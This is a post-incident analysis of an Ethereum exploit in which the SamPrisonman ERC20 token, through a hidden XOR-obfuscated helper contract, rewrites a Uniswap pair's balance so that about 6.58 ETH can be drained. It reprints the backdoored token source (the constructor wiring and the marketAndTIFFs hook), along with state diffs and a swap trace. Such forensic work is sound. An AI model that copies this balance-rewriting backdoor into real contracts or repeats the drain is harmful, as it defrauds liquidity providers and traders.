## Incident Overview & TL;DR

An adversary-controlled EOA on Ethereum mainnet used a malicious ERC20 token, SamPrisonman (symbol `SBF`), wired to an external helper contract to manipulate the token balance recorded for the SamPrisonman–WETH Uniswap V2 pair. With only 4000 wei of input, the adversary executed a single swap transaction that drained approximately 6.58 ETH of value from the pool.  
  
The exploit hinges on SamPrisonman’s non-standard transfer hook `marketAndTIFFs`, which delegates balance updates to a hidden helper contract at `0x7911425808e57b110D2451aB67B6980f9cA9D370` via function selector `0x569937dd`. This helper determines a 32-byte `result` used to overwrite `_balances[sender]` as `result - amount`, allowing arbitrary manipulation of balances, including the Uniswap pair’s balance, without changing `totalSupply`.

From a root-cause perspective, this is a protocol-level backdoor: the token’s transfer logic calls an attacker-controlled helper that can set `_balances[sender] = result - amount` based on opaque arithmetic and helper state. This design enables deliberate mis-accounting of the SamPrisonman balance held by the Uniswap pair and a deterministic, fee-accounted drain of WETH reserves once the helper’s gating state is primed.

The core victim transaction is:

- Seed / attacker-profit tx (Ethereum mainnet):  
  `0x6c8aed8d0eab29416cd335038cd5ee68c5e27bfb001c9eac7fc14c7075ed4420`

Additional related transactions:

- SamPrisonman deployment:  
  `0x44f3a239563848c123dd24e22f7b7ba2b8e0901fc24e801b3de19a8d340a33a8`
- Helper deployment:  
  `0x76c4942e09eb428eca4e576eca5d073c782d8002696e3abeb361179004c4d93f`


## Key Background

SamPrisonman (`SBF`) is presented as a standard ERC20 token but its internal implementation is modified in a way that embeds an external balance controller.

- The `_transfer` implementation is augmented with an internal hook `marketAndTIFFs` that calls an external contract at an address stored in storage slot `0x52`. The hook passes the transfer amount to the helper and then loads the returned 32-byte word as `result`, writing `_balances[sender] = result - amount`. This means the helper fully controls the sender’s new balance on every transfer.
- The helper contract at `0x7911425808e57b110D2451aB67B6980f9cA9D370` is deployed by EOA `0x8abe67e894b954012420b96eac3e0c63cca1341f` and is referenced directly from SamPrisonman’s constructor, which XORs two constants in slots `0x50` and `0x51` to derive the helper address into slot `0x52`. This wiring shows the helper is an intentional component of the token’s design, not a third-party integration.
- Liquidity for SamPrisonman is provided on a Uniswap V2-like pair at `0x76EA342BC038d665e8a116392c82552D2605edA1` against WETH (`0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`). Traders using `UniswapV2Router02` expect reserves held by the pair to truthfully reflect token balances and to obey standard invariant-based pricing. By delegating balance control to an opaque helper, SamPrisonman breaks this expectation and enables reserve mis-accounting.

### Key token code snippet (SamPrisonman)

The following excerpt from the verified SamPrisonman source shows the constructor wiring the helper and the transfer hook:

```solidity
// SamPrisonman ERC20 source (Contract.sol)
constructor (string memory name_, string memory symbol_) {
    _name = name_;
    _symbol = symbol_;

    assembly {
        sstore(0x50,0x51d435fef45d7927301665f2c2bdbd3d85ec4d53d1be)
        sstore(0x51,0x51d44cefb60571c24b0768d69316da8b1de3d1fa02ce)
        sstore(0x52,xor(sload(0x50),sload(0x51)))
    }

    router = IDEXRouter(_router);
}

function marketAndTIFFs(address sender, uint256 amount) internal returns (uint256 result) {
    assembly {
        let data := mload(0x40)
        mstore(data, 0x569937dd00000000000000000000000000000000000000000000000000000000)
        mstore(add(data, 0x04), amount)
        mstore(0x40, add(data, 0x24))
        let success := call(gas(), sload(0x52), 0, data, 0x24, data, 0x20)
        if success { result := mload(data) }
    }

    _balances[sender] = result - amount;
}

function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    msgSend = sender;
    msgReceive = recipient;
    require(((trade == true) || (msgSend == address(this)) || (msgSend == owner())), "ERC20: trading is not yet enabled");
    require(msgSend != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    marketAndTIFFs(sender, amount);
    _balances[recipient] += amount;
    emit Transfer(sender, recipient, amount);
}
```

*Caption: SamPrisonman’s constructor obfuscates and stores the helper address in slot `0x52`, and every transfer calls the helper via selector `0x569937dd` before forcibly rewriting the sender’s balance.*


## Vulnerability & Root Cause Analysis

### Vulnerability brief

SamPrisonman embeds a hidden external balance controller. Every token transfer calls `helper::0x569937dd`, allowing the helper to arbitrarily determine the sender’s stored balance without changing `totalSupply`. This mechanism lets the adversary rewrite the SamPrisonman balance held by the Uniswap pair, manipulating apparent reserves and prices.

### Detailed root-cause mechanism

1. **Helper wiring and hidden backdoor**
   - SamPrisonman’s `ERC20` base contract defines `marketAndTIFFs(sender, amount)`, which assembles calldata for selector `0x569937dd` and executes an EVM `CALL` to the address stored at storage slot `0x52`.
   - In the constructor, two constants are written to slots `0x50` and `0x51`, and their XOR is stored into slot `0x52`. The resolved address is helper contract `0x7911425808e57b110D2451aB67B6980f9cA9D370`, as confirmed by the Etherscan-style `getcontractcreation.json`.
   - On each transfer, `_transfer` calls `marketAndTIFFs`, and if the helper call succeeds, the returned 32-byte `result` is loaded and SamPrisonman executes `_balances[sender] = result - amount`. This means the helper directly dictates the sender’s post-transfer balance.

2. **Helper contract behavior (0x569937dd)**
   - The helper’s `0x569937dd` implementation, reconstructed from runtime bytecode, full disassembly, and helper state diffs, maintains:
     - Scalar `counter` at slot `0x01` that increments on each successful call.
     - Scalar `thisBlock` at slot `0x13` that tracks the last successful `block.number`.
     - An internal accumulator at slot `0x0f` whose value is updated with each call.
     - Several mappings, including `storage_map_k` at slot `6`, plus other mappings inferred from state diff keys.
   - A pre-seed snapshot of `storage_map_k` shows that only the helper deployer address `0x8abe67e894b954012420b96eac3e0c63cca1341f` has a tag value `1`; the router, SamPrisonman token, pair, attacker, and intermediate address all have tag `0`.
   - During the attacker-profit transaction, helper state diffs show:
     - `counter` increasing from `13` to `14`.
     - `thisBlock` updated from `21989665` to `21992034`.
     - The accumulator at slot `0x0f` changing from `113877141344911030987113` to `91855277955`.
     - New mapping entries keyed to the intermediate address `0x8Eb4D96A326638BBeb5b11caF659B8529E65A2C8` and a tag value `2`, consistent with the helper tracking exploit-related addresses.

3. **SamPrisonman state changes in the attacker tx**
   - For the attacker-profit tx `0x6c8a…4420`, SamPrisonman’s `totalSupply` remains fixed at `1e27` units:

```json
// SamPrisonman state diff (decoded)
{
  "totalSupply": {
    "slot_index_decimal": 10,
    "pre": "1000000000000000000000000000",
    "post": "1000000000000000000000000000",
    "delta": "0"
  }
}
```

*Caption: SamPrisonman’s `totalSupply` is unchanged across the exploit transaction, ruling out mint/burn as the source of profit.*

   - The raw SamPrisonman storage diff shows three changed slots:

```json
// SamPrisonman raw storage diff (attacker-profit tx)
{
  "storage_diff": {
    "0xd911edfa5b...973cf": {
      "from": null,
      "to": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffea9cffb07c"
    },
    "0x6d5bc7858a...324f2": {
      "from": "0x0000000000000000000000000000000000000000007d59f8874b3d90d95dc5f0",
      "to": "0x0000000000000000000000000000000000000000000000000000001563004f84"
    },
    "0x0000000000...000d": {
      "from": "0x000000000000000000000000dfc7a89a46118665f38630ee5a8dc51393b9f468",
      "to": "0x0000000000000000000000008eb4d96a326638bbeb5b11caf659b8529e65a2c8"
    }
  }
}
```

*Caption: SamPrisonman storage changes include a large accumulator-like slot update, a rewrite of the pair’s balance slot, and a change of `msgSend` to the intermediate address.*

   - The ERC20 balance diff tracer attributes slot key `0x6d5b…324f2` to the SamPrisonman–WETH pair `0x76EA342BC038d665e8a116392c82552D2605edA1` and reports:
     - Pre-state pair balance: `151540602610287835936048624`.
     - Post-state pair balance: `91855277956`.
     - Delta: `-151540602610287744080770668`.
     - The new value `0x1563004f84` equals `91855277956`, and the attacker later sells exactly `91855277955` tokens back to the pool.

4. **Reserve mis-accounting and DEX exploitation**
   - Immediately before the Uniswap `swapExactTokensForETHSupportingFeeOnTransferTokens` call, the trace shows:
     - `SamPrisonman::balanceOf(pair)` returning `91855277956`.
     - `getReserves()` for the pair being used to compute the swap output.
   - After the helper-induced rebalancing of the pair’s SamPrisonman balance, the attacker sells `91855277955` SBF back to WETH. Because the pool now appears to hold only `91855277956` SBF, the swap effectively sells almost the entire apparent supply in the pool, causing a large amount of WETH to be transferred out.
   - Since `totalSupply` did not change and no corresponding user balances lost SBF, the profit comes entirely from mis-accounting the pair’s balance: the helper and `marketAndTIFFs` have redirected almost all of the previously recorded pair balance into an opaque helper-controlled accumulator while leaving just enough SBF in the pool for the swap to succeed.

### Exploit conditions

The exploit requires the following conditions:

1. **Helper wiring and liquidity**
   - SamPrisonman must be deployed with helper slot `0x52` pointing to `0x7911…D370` and liquidity added to the SamPrisonman–WETH pair, so that swaps route through this pool.
2. **Helper gating state**
   - Helper function `0x569937dd` must have its internal gating state (e.g., `counter`, `thisBlock`, and `storage_map_k` tag for an address derived via `msgReceive`) in a configuration that allows calls from SamPrisonman to succeed. The helper state snapshot shows `counter >= 13` and a tag value `1` only for the helper deployer address at pre-state, indicating that the necessary configuration is already satisfied as part of the pre-exploit state.
3. **Adversary access to swaps**
   - An adversary-controlled EOA must be able to buy SamPrisonman via `UniswapV2Router02` and then perform SamPrisonman transfers that trigger `helper::0x569937dd` just before selling SamPrisonman back to WETH. This ensures the pair’s SamPrisonman balance is rewritten to an attacker-favorable value immediately prior to the profit-taking swap.

### Security principles violated

- **ERC20 accounting integrity**: `balanceOf` and `totalSupply` no longer correspond to a consistent ownership distribution when a hidden helper can arbitrarily overwrite `_balances[sender]`. This breaks standard ERC20 assumptions about how balances change over time.
- **DEX reserve invariants**: Uniswap V2 pricing assumes token balances held by the pair reflect actual reserves. SamPrisonman and its helper violate this assumption by rewriting the pair’s token balance just before a swap, allowing the adversary to bypass typical slippage and reserve protections.
- **Transparency of protocol behavior**: Critical pricing and balance logic is moved into an unverified helper contract that is not apparent from a superficial read of the ERC20 interface. Users cannot easily audit or reason about the risk that an external helper can unilaterally rewrite balances.


## Adversary Flow Analysis

### Strategy summary

The adversary executed a single on-chain swap transaction from an EOA that exploited a deliberately backdoored ERC20-plus-helper combination. By rewriting the DEX pool’s SamPrisonman balance immediately before selling into it, the adversary drained WETH reserves in one step without retaining SamPrisonman balances.

### Adversary-related accounts

- `0x97d8170e04771826a31c4c9b81e9f9191a1c8613`  
  - Type: EOA (`is_eoa = true`, `is_contract = false`).  
  - Role: Sender of the attacker-profit transaction `0x6c8a…4420`. `native_balance_deltas` in `balance_diff.json` show a net ETH gain of approximately `6.5789` ETH for this address across the transaction, and the trace shows WETH unwrapped and sent to this address.

- `0x8abe67e894b954012420b96eac3e0c63cca1341f`  
  - Type: EOA (`is_eoa = true`, `is_contract = false`).  
  - Role: Deployer of helper contract `0x7911…D370`, as shown in `txlist_full.json`. The helper’s `storage_map_k` tagging shows that this address is the only one with tag `1` in the pre-state, indicating privileged configuration of the helper’s gating logic.

- `0xec9ba7426d9f8b4c826b4972ce9d3dc86f0bccba`  
  - Type: EOA (`is_eoa = true`, `is_contract = false`).  
  - Role: Contract creator of SamPrisonman `0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700` per `getcontractcreation.json`, responsible for deploying a token that hard-wires the helper backdoor into its transfer logic.

- `0x7911425808e57b110D2451aB67B6980f9cA9D370`  
  - Type: Contract (`is_eoa = false`, `is_contract = true`).  
  - Role: Helper contract referenced from SamPrisonman slot `0x52` and invoked via selector `0x569937dd` inside `marketAndTIFFs`. The runtime code and disassembly show stateful logic that updates scalars and mappings, and helper state diffs confirm its role in driving the exploit.

- `0x8Eb4D96A326638BBeb5b11caF659B8529E65A2C8`  
  - Type: EOA (`is_eoa = true`, `is_contract = false`).  
  - Role: Intermediate address that receives SamPrisonman from the Uniswap pair during `swapExactETHForTokensSupportingFeeOnTransferTokens` and then invokes `swapExactTokensForETHSupportingFeeOnTransferTokens` to sell `91855277955` tokens back. Helper state diffs map a key to this address during `0x569937dd` execution, and the trace shows it acting as the attacker’s token holder.

#### Victim candidates

- **SamPrisonman–WETH UniswapV2Pair**  
  - Chain: Ethereum mainnet (`chainid = 1`).  
  - Address: `0x76EA342BC038d665e8a116392c82552D2605edA1`.  
  - The pair’s reserves and SamPrisonman balance are manipulated via the helper-backed transfer hook, making this contract a direct victim.

- **Liquidity Providers for the SamPrisonman–WETH pool**  
  - Chain: Ethereum mainnet (`chainid = 1`).  
  - WETH address: `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`.  
  - Liquidity providers bear the economic loss from drained WETH reserves when the pair’s accounting is subverted.

### Adversary lifecycle stages

#### 1. Adversary contract deployment and wiring

- Transactions:
  - `0x76c4942e09eb428eca4e576eca5d073c782d8002696e3abeb361179004c4d93f` (block `21245086`, mechanism `deploy`) – helper deployment.
  - `0x44f3a239563848c123dd24e22f7b7ba2b8e0901fc24e801b3de19a8d340a33a8` (block `21989574`, mechanism `deploy`) – SamPrisonman deployment.

Helper `0x7911…D370` is deployed by EOA `0x8abe67…`. SamPrisonman `0xdDF3…` is deployed by EOA `0xec9b…`, with its constructor hard-coding helper slot `0x52` to `0x7911…D370` via the XOR-of-constants pattern, establishing a permanent backdoor connection between the token and the helper.

Relevant evidence includes:

```json
// SamPrisonman contract creation metadata (getcontractcreation.json)
{
  "contractAddress": "0xddf309b8161aca09ea6bbf30dd7cbd6c474ff700",
  "contractCreator": "0xec9ba7426d9f8b4c826b4972ce9d3dc86f0bccba",
  "txHash": "0x44f3a239563848c123dd24e22f7b7ba2b8e0901fc24e801b3de19a8d340a33a8"
}
```

*Caption: On-chain contract creation data links SamPrisonman to deployer `0xec9b…` and shows the deployment tx used in the analysis.*

#### 2. Liquidity provisioning and helper priming

- Transaction:
  - `0x44f3a239563848c123dd24e22f7b7ba2b8e0901fc24e801b3de19a8d340a33a8` (block `21989574`, mechanism `mint` and subsequent owner actions).

SamPrisonman’s internal `_DeploySamPrisonman` mints `1e9 * 1e18` tokens to the creator, and owner actions (including `openTrade` and adding liquidity via `UniswapV2Router02`) populate the SamPrisonman–WETH pair with a large SamPrisonman balance. At the same time, helper state is primed so that:

- `counter >= 13`.
- `storage_map_k` has tag `1` only for the helper deployer address at pre-state.

This configuration is confirmed by helper state snapshots and is already in place before the attacker-profit tx. The high pre-state SamPrisonman balance at the pair and helper counters demonstrate that the backdoor is ready to be triggered by a subsequent trade.

Key evidence:

```json
// Helper storage_map_k pre-seed snapshot
{
  "mapping_name": "storage_map_k",
  "slot_index_decimal": 6,
  "entries": [
    {
      "address": "0x8abe67e894b954012420b96eac3e0c63cca1341f",
      "label": "helper_deployer",
      "decoded_int": "1",
      "tag_byte_low": 1
    },
    {
      "address": "0x76ea342bc038d665e8a116392c82552d2605eda1",
      "label": "pair_samprisonman_weth",
      "decoded_int": "0",
      "tag_byte_low": 0
    }
  ]
}
```

*Caption: Before the exploit tx, the helper’s `storage_map_k` gating mapping tags only the helper deployer address with `1`, indicating privileged configuration.*

#### 3. Adversary profit-taking swap

- Transaction:
  - `0x6c8aed8d0eab29416cd335038cd5ee68c5e27bfb001c9eac7fc14c7075ed4420` (block `21992034`, mechanism `swap`).

The attacker EOA `0x97d8…` sends a contract-creation + swap transaction that performs the following sequence:

1. **Buy leg**:
   - Calls `UniswapV2Router02::swapExactETHForTokensSupportingFeeOnTransferTokens` with `4000` wei of ETH, routing `WETH → SamPrisonman`, and sending SamPrisonman tokens to intermediate EOA `0x8Eb4…`.

2. **Helper-triggered balance rewrite**:
   - During the SamPrisonman transfer from the pair to 0x8Eb4…, `_transfer` invokes `marketAndTIFFs`, which calls helper `0x569937dd`.
   - The helper updates its scalar and mapping state (including entries keyed to 0x8Eb4…) and causes SamPrisonman’s storage slot for the pair’s balance to be rewritten from `151540602610287835936048624` to `91855277956`, while `totalSupply` stays constant.

3. **Sell leg**:
   - Intermediate address `0x8Eb4…` calls `UniswapV2Router02::swapExactTokensForETHSupportingFeeOnTransferTokens` to sell `91855277955` SamPrisonman tokens back to WETH for the benefit of attacker EOA `0x97d8…`.
   - The Uniswap pair, seeing only `91855277956` SBF as its SamPrisonman balance, prices the trade as if nearly the entire pool is being sold, paying out a large amount of WETH.
   - WETH is then unwrapped to ETH and forwarded to the attacker EOA.

The cast trace shows this sequence clearly:

```bash
# Seed transaction trace (cast run -vvvvv for 0x6c8a…4420)
UniswapV2Router02::swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4000}(
  0,
  [WETH, SamPrisonman],
  0x8Eb4D96A326638BBeb5b11caF659B8529E65A2C8,
  1741314623
)
...
UniswapV2Router02::swapExactTokensForETHSupportingFeeOnTransferTokens(
  91855277955,
  0,
  [SamPrisonman, WETH],
  0x97d8170e04771826A31C4c9B81E9f9191a1C8613,
  1741314623
)
...
SamPrisonman::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
  ← [Return] 91855277956
...
emit Swap(
  amount0Out: 91855277955,
  amount1Out: 6579305366497962415
)
```

*Caption: The seed trace shows the buy and sell legs, SamPrisonman’s manipulated balance at the pair, and the final Uniswap swap that sends ~6.579 ETH worth of WETH out of the pool.*

The corresponding balance diff confirms the ETH profit:

```json
// Native balance deltas for tx 0x6c8a…4420
{
  "native_balance_deltas": [
    {
      "address": "0x97d8170e04771826a31c4c9b81e9f9191a1c8613",
      "before_wei": "94440998428754535",
      "after_wei": "6673372155468771150",
      "delta_wei": "6578931157040016615"
    },
    {
      "address": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
      "delta_wei": "-6579305366497958415"
    }
  ]
}
```

*Caption: The attacker EOA’s ETH balance increases by ~6.5789 ETH, while the WETH contract’s balance decreases by a matching amount, consistent with WETH being drained from the pool and unwrapped to ETH for the attacker.*


## Impact & Losses

### Quantitative impact

- **Reference asset**: ETH  
- **Primary victim contract**: SamPrisonman–WETH Uniswap V2 pair  
  - Address: `0x76EA342BC038d665e8a116392c82552D2605edA1`

Approximate on-chain amounts attributed to the attacker-profit transaction:

- WETH / ETH reserves drained from the pair:  
  - About `6.579305366497958415` ETH equivalent removed from the SamPrisonman–WETH pool.
- Attacker net gain after gas:  
  - Approximately `6.5789` ETH net to EOA `0x97d8…`, as reflected in `native_balance_deltas`.

### Qualitative impact

- Liquidity providers in the SamPrisonman–WETH pool bear the direct economic loss from drained WETH reserves.
- The pool’s pricing and quoting behavior becomes meaningless because SamPrisonman balances are under arbitrary off-ERC20 control via the helper. Any subsequent trader interacting with the pool faces unpredictable and adversary-controlled pricing, even if the numerical reserves on-chain appear consistent at a glance.


## References

Key supporting artifacts used in this analysis include:

- **[1] Seed tx metadata and balance diff for 0x6c8a…4420**  
  - Contains the full cast trace and `balance_diff.json` used to derive victim balances and ETH deltas.

- **[2] SamPrisonman ERC20 source `Contract.sol`**  
  - Provides the verified token implementation, including the helper wiring, `marketAndTIFFs`, and `_transfer` logic.

- **[3] Helper 0x7911…D370 runtime code, disassembly, and 0x569937dd pseudocode**  
  - Contains disassembly and pseudocode describing the helper’s internal state, mappings, and role in balance rewriting.

- **[4] SamPrisonman and helper state diffs for the attacker-profit tx**  
  - Includes pre/post storage diffs for SamPrisonman and the helper, helper scalar and mapping summaries, and decoded SamPrisonman fields such as `totalSupply` and known balances.

